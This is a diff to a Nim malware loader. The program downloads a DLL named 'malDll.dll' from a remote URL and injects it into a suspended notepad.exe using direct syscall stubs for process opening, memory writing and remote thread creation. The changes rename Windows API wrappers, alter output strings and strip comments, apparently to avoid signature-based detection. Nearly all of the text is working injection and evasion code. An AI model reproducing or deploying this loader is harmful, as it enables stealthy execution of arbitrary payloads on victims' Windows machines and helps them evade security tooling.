@@ -7,7 +7,47 @@ import ptr_math
 import GetSyscallStub
 import osproc
 
-# Unmanaged NTDLL Declarations
+#[BOOL VirtualProtect(
+  [in]  LPVOID lpAddress,
+  [in]  SIZE_T dwSize,
+  [in]  DWORD  flNewProtect,
+  [out] PDWORD lpflOldProtect
+);
+LPVOID VirtualAlloc(
+  [in, optional] LPVOID lpAddress,
+  [in]           SIZE_T dwSize,
+  [in]           DWORD  flAllocationType,
+  [in]           DWORD  flProtect
+);
+
+LPVOID VirtualAllocEx(
+  [in]           HANDLE hProcess,
+  [in, optional] LPVOID lpAddress,
+  [in]           SIZE_T dwSize,
+  [in]           DWORD  flAllocationType,
+  [in]           DWORD  flProtect
+);
+
+HANDLE OpenProcess(
+  [in] DWORD dwDesiredAccess,
+  [in] BOOL  bInheritHandle,
+  [in] DWORD dwProcessId
+);
+
+]#
+
+proc VirtAEx*(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID
+  {.discardable, stdcall, dynlib: "kernel32", importc: "VirtualAllocEx".}
+
+proc VirtProt*(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): BOOL 
+  {.discardable, stdcall, dynlib: "kernel32", importc: "VirtualProtect".}
+
+proc GetCPID*(): DWORD
+  {.discardable, stdcall, dynlib: "kernel32", importc: "GetCurrentProcessId".}
+
+proc OpenP*(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD): HANDLE
+  {.discardable, stdcall, dynlib: "kernel32", importc: "OpenProcess".}
+
 type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
 type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
 type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
@@ -20,15 +60,14 @@ proc toString(bytes: openarray[byte]): string =
 proc injct(name: string): void =
     let k32Str: string = "kernel32.dll"
     let loadlibAStr: string = "LoadLibraryA"
-
+    let tProcStr: string = "notepad.exe"
     var SYSCALL_STUB_SIZE: int = 23;
 
-    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
-    let tProcess = startProcess("notepad.exe")
-    tProcess.suspend() # That's handy!
+    let tProcess = startProcess(tProcStr)
+    tProcess.suspend()
     defer: tProcess.close()
 
-    echo "[*] Target Process: ", tProcess.processID
+    echo "[*] Target P: ", tProcess.processID
 
     var cid: CLIENT_ID
     var oa: OBJECT_ATTRIBUTES
@@ -39,10 +78,10 @@ proc injct(name: string): void =
 
     cid.UniqueProcess = tProcess.processID
     
-    let tProcess2 = GetCurrentProcessId()
-    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+    let tProcess2 = GetCPID()
+    var pHandle2: HANDLE = OpenP(PROCESS_ALL_ACCESS, FALSE, tProcess2)
 
-    let syscallStub_NtOpenP = VirtualAllocEx(
+    let syscallStub_NtOpenP = VirtAEx(
         pHandle2,
         NULL,
         cast[SIZE_T](SYSCALL_STUB_SIZE),
@@ -58,29 +97,31 @@ proc injct(name: string): void =
 
     var oldProtection: DWORD = 0
 
-    # define NtOpenProcess
     var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP));
-    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+    VirtProt(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
 
-    # define NtAllocateVirtualMemory
     let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
-    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+    VirtProt(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
 
-    # define NtWriteVirtualMemory
     let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite));
-    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+    VirtProt(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
 
-    # define NtCreateThreadEx
     let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate));
-    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+    VirtProt(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
 
     var status: NTSTATUS
     var success: BOOL
+    
+    let
+        ntOPStr: LPCSTR = "NtOpenProcess"
+        ntAVMStr: LPCSTR = "NtAllocateVirtualMemory"
+        ntWVMStr: LPCSTR = "NtWriteVirtualMemory"
+        ntCTEStr: LPCSTR = "NtCreateThreadEx"
 
-    success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP));
-    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
-    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
-    success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate));
+    success = GetSyscallStub(ntOPStr, cast[LPVOID](syscallStub_NtOpenP));
+    success = GetSyscallStub(ntAVMStr, cast[LPVOID](syscallStub_NtAlloc));
+    success = GetSyscallStub(ntWVMStr, cast[LPVOID](syscallStub_NtWrite));
+    success = GetSyscallStub(ntCTEStr, cast[LPVOID](syscallStub_NtCreate));
 
     
     status = NtOpenProcess(
@@ -89,7 +130,7 @@ proc injct(name: string): void =
         &oa, &cid         
     )
 
-    echo "[*] pHandle: ", pHandle
+    echo "[*] proc Han: ", pHandle
 
     status = NtAllocateVirtualMemory(
         pHandle, &ds, 0, &dll_size, 
@@ -101,11 +142,11 @@ proc injct(name: string): void =
     status = NtWriteVirtualMemory(
         pHandle, 
         ds, 
-        name.cstring, #unsafeAddr shellcode, 
+        name.cstring, 
         dll_size-1, 
         addr bytesWritten);
 
-    echo "[*] NtWriteVirtualMemory: ", status
+    echo "[*] NtWVirtMem: ", status
     echo "    \\-- bytes written: ", bytesWritten
     echo ""
 
@@ -123,8 +164,8 @@ proc injct(name: string): void =
     status = NtClose(tHandle)
     status = NtClose(pHandle)
 
-    echo "[*] tHandle: ", tHandle
-    echo "[+] Injected"
+    echo "[*] t Han: ", tHandle
+    echo "[+] Success!"
     echo success
    
 proc dwnld(url: string): bool =
@@ -143,6 +184,6 @@ proc dwnld(url: string): bool =
 when defined(windows):
     when defined(amd64):
         when isMainModule:
-            if dwnld("http://jhgyufyuhjtgyfjbhgvjhkh876.net/malDll.dll"):
+            if dwnld("http://192.168.0.127:8000/malDll.dll"):
                 injct("malDll.dll")
                 var pauseEx = readLine(stdin)
